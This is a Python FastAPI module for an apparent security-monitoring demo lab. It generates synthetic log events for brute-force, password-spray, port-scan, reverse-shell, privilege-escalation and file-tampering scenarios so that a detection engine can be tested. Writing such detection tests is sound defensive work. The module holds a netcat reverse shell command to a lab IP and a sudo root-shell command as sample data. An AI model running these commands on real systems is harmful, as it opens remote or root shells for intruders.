import datetime
import random
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from typing import Dict, Any, List

from backend.app.api.deps import get_db
from backend.app.schemas.schemas import EventIngest
from backend.app.services.event_service import event_service
from backend.app.models.models import Event, Alert, Incident, ResponseAction, AuditLog

router = APIRouter(prefix="/demo", tags=["Demo Lab Attack Simulations"])

@router.post("/simulate/brute-force")
def simulate_brute_force(
    target_host: str = "ubuntu-lab-01",
    attacker_ip: str = "192.168.56.101",
    attempts: int = 6,
    db: Session = Depends(get_db)
):
    """Simulate repeated failed SSH authentications triggering SSH Brute-Force rule (DET-001)."""
    generated_events = []
    generated_alerts = []

    for i in range(attempts):
        now = datetime.datetime.utcnow()
        payload = EventIngest(
            timestamp=now,
            source="demo-lab",
            hostname=target_host,
            source_ip=attacker_ip,
            destination_ip="192.168.56.10",
            source_port=43210 + i,
            destination_port=22,
            protocol="TCP",
            event_type="failed_login",
            category="authentication",
            severity="medium",
            username="root" if i % 2 == 0 else "admin",
            message=f"Failed SSH login attempt for invalid user from {attacker_ip} port {43210 + i}",
            raw_log=f"sshd[{12340+i}]: Failed password for invalid user admin from {attacker_ip} port {43210+i} ssh2",
            is_synthetic=True
        )
        ev, alerts = event_service.ingest_event(db, payload)
        generated_events.append(ev.id)
        for a in alerts:
            generated_alerts.append({"alert_id": a.alert_id, "title": a.title, "severity": a.severity})

    return {
        "status": "success",
        "simulation": "SSH Brute-Force Attack",
        "events_ingested": len(generated_events),
        "target": target_host,
        "attacker_ip": attacker_ip,
        "alerts_generated": generated_alerts,
        "summary": f"Ingested {len(generated_events)} failed login attempts. Detection engine evaluated telemetry and triggered automated response playbook."
    }

@router.post("/simulate/login-after-failed")
def simulate_login_after_failed(
    target_host: str = "ubuntu-lab-01",
    attacker_ip: str = "192.168.56.105",
    db: Session = Depends(get_db)
):
    """Simulate repeated failures followed immediately by successful authentication (DET-002)."""
    # 3 failures
    for i in range(3):
        p_fail = EventIngest(
            timestamp=datetime.datetime.utcnow(),
            source="demo-lab",
            hostname=target_host,
            source_ip=attacker_ip,
            destination_ip="192.168.56.10",
            source_port=51000 + i,
            destination_port=22,
            protocol="TCP",
            event_type="failed_login",
            category="authentication",
            severity="medium",
            username="analyst_svc",
            message=f"Failed SSH password for analyst_svc from {attacker_ip}",
            is_synthetic=True
        )
        event_service.ingest_event(db, p_fail)

    # 1 success
    p_succ = EventIngest(
        timestamp=datetime.datetime.utcnow(),
        source="demo-lab",
        hostname=target_host,
        source_ip=attacker_ip,
        destination_ip="192.168.56.10",
        source_port=51005,
        destination_port=22,
        protocol="TCP",
        event_type="auth_success",
        category="authentication",
        severity="critical",
        username="analyst_svc",
        message=f"Accepted password for analyst_svc from {attacker_ip} port 51005 ssh2",
        raw_log=f"sshd[15982]: Accepted password for analyst_svc from {attacker_ip} port 51005 ssh2",
        is_synthetic=True
    )
    ev, alerts = event_service.ingest_event(db, p_succ)

    return {
        "status": "success",
        "simulation": "Compromised Account (Login After Failures)",
        "attacker_ip": attacker_ip,
        "target": target_host,
        "alerts_generated": [{"alert_id": a.alert_id, "title": a.title, "severity": a.severity} for a in alerts],
        "summary": "Simulated credential stuffing resulting in successful login. Critical alert raised."
    }

@router.post("/simulate/port-scan")
def simulate_port_scan(
    target_host: str = "ubuntu-lab-02",
    attacker_ip: str = "192.168.56.115",
    db: Session = Depends(get_db)
):
    """Simulate port reconnaissance across multiple target ports (DET-003)."""
    ports = [21, 22, 23, 25, 80, 443, 3306, 8080]
    generated_alerts = []

    for port in ports:
        payload = EventIngest(
            timestamp=datetime.datetime.utcnow(),
            source="demo-lab",
            hostname=target_host,
            source_ip=attacker_ip,
            destination_ip="192.168.56.20",
            source_port=random.randint(40000, 60000),
            destination_port=port,
            protocol="TCP",
            event_type="port_scan",
            category="network",
            severity="medium",
            message=f"SYN connection probe targeting TCP port {port} from {attacker_ip}",
            raw_log=f"iptables-log: PROTO=TCP SPT=49152 DPT={port} SRC={attacker_ip} DST=192.168.56.20 SYN",
            is_synthetic=True
        )
        _, alerts = event_service.ingest_event(db, payload)
        for a in alerts:
            generated_alerts.append({"alert_id": a.alert_id, "title": a.title, "severity": a.severity})

    return {
        "status": "success",
        "simulation": "Network Port Reconnaissance Scan",
        "ports_scanned": ports,
        "target": target_host,
        "attacker_ip": attacker_ip,
        "alerts_generated": generated_alerts,
        "summary": f"Probe across {len(ports)} ports generated network discovery alert and proposed containment."
    }

@router.post("/simulate/suspicious-process")
def simulate_suspicious_process(
    target_host: str = "ubuntu-lab-01",
    command: str = "nc -e /bin/bash 192.168.56.150 4444",
    db: Session = Depends(get_db)
):
    """Simulate execution of suspicious reverse shell command (DET-005)."""
    payload = EventIngest(
        timestamp=datetime.datetime.utcnow(),
        source="demo-lab",
        hostname=target_host,
        source_ip="192.168.56.150",
        destination_ip="192.168.56.10",
        source_port=4444,
        event_type="suspicious_process",
        category="process",
        severity="high",
        username="www-data",
        process_name="nc",
        process_id=9872,
        command_line=command,
        message=f"Suspicious interactive shell spawned: {command}",
        raw_log=f"auditd[8821]: EXECVE pid=9872 uid=33 comm='nc' args='{command}'",
        is_synthetic=True
    )
    ev, alerts = event_service.ingest_event(db, payload)
    return {
        "status": "success",
        "simulation": "Suspicious Process Execution",
        "process": "nc",
        "command_line": command,
        "alerts_generated": [{"alert_id": a.alert_id, "title": a.title, "severity": a.severity} for a in alerts],
        "summary": "Reverse shell signature detected. High severity alert raised and endpoint flagged."
    }

@router.post("/simulate/privilege-escalation")
def simulate_privilege_escalation(
    target_host: str = "ubuntu-lab-01",
    db: Session = Depends(get_db)
):
    """Simulate unauthorized privilege elevation (DET-004)."""
    payload = EventIngest(
        timestamp=datetime.datetime.utcnow(),
        source="demo-lab",
        hostname=target_host,
        source_ip="192.168.56.101",
        event_type="privilege_escalation",
        category="process",
        severity="critical",
        username="guest_user",
        process_name="sudo",
        process_id=10452,
        command_line="sudo /bin/su root -c /bin/bash",
        message="Unauthorized privilege escalation detected: user 'guest_user' invoked root shell via sudoers bypass",
        raw_log="sudo[10452]: guest_user : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        is_synthetic=True
    )
    ev, alerts = event_service.ingest_event(db, payload)
    return {
        "status": "success",
        "simulation": "Privilege Escalation",
        "target": target_host,
        "alerts_generated": [{"alert_id": a.alert_id, "title": a.title, "severity": a.severity} for a in alerts],
        "summary": "Privilege escalation detected and correlated into critical incident."
    }

@router.post("/simulate/file-modification")
def simulate_file_modification(
    target_host: str = "ubuntu-lab-02",
    file_path: str = "/etc/passwd",
    db: Session = Depends(get_db)
):
    """Simulate unauthorized system file modification (DET-006)."""
    payload = EventIngest(
        timestamp=datetime.datetime.utcnow(),
        source="demo-lab",
        hostname=target_host,
        event_type="file_modified",
        category="file_integrity",
        severity="high",
        message=f"Critical system configuration altered: {file_path} cryptographic hash mismatch",
        raw_log=f"fim-agent[410]: SHA256 checksum changed for {file_path} from e3b0c44... to 88c21a...",
        is_synthetic=True
    )
    ev, alerts = event_service.ingest_event(db, payload)
    return {
        "status": "success",
        "simulation": "File Integrity Breach",
        "file_path": file_path,
        "alerts_generated": [{"alert_id": a.alert_id, "title": a.title, "severity": a.severity} for a in alerts],
        "summary": f"File integrity breach on {file_path} detected."
    }

@router.post("/simulate/password-spray")
def simulate_password_spray(
    target_host: str = "ubuntu-lab-01",
    attacker_ip: str = "192.168.56.120",
    db: Session = Depends(get_db)
):
    """Simulate password spraying across multiple usernames (DET-007)."""
    usernames = ["administrator", "backup_adm", "dev_ops", "deployer", "sys_monitor"]
    generated_alerts = []

    for user in usernames:
        payload = EventIngest(
            timestamp=datetime.datetime.utcnow(),
            source="demo-lab",
            hostname=target_host,
            source_ip=attacker_ip,
            destination_ip="192.168.56.10",
            source_port=random.randint(45000, 55000),
            destination_port=22,
            protocol="TCP",
            event_type="failed_login",
            category="authentication",
            severity="medium",
            username=user,
            message=f"Failed authentication attempt for username '{user}' from {attacker_ip}",
            is_synthetic=True
        )
        _, alerts = event_service.ingest_event(db, payload)
        for a in alerts:
            generated_alerts.append({"alert_id": a.alert_id, "title": a.title, "severity": a.severity})

    return {
        "status": "success",
        "simulation": "Password Spraying Campaign",
        "targeted_accounts": usernames,
        "attacker_ip": attacker_ip,
        "alerts_generated": generated_alerts,
        "summary": f"Password spray attempt across {len(usernames)} accounts detected."
    }

@router.post("/reset")
def reset_demo_data(db: Session = Depends(get_db)):
    """Reset synthetic demo records while keeping baseline configuration."""
    db.query(Event).filter(Event.is_synthetic == True).delete()
    for r in db.query(Alert).all():
        if "Simulated" in r.description or "192.168.56." in (r.source_ip or ""):
            db.delete(r)
    db.commit()

    audit = AuditLog(
        actor="admin",
        action="RESET_DEMO_DATA",
        resource_type="demo_lab",
        outcome="success",
        details="Demo lab synthetic simulation events and alerts cleared."
    )
    db.add(audit)
    db.commit()

    return {"status": "success", "message": "Demo simulation events reset successfully."}
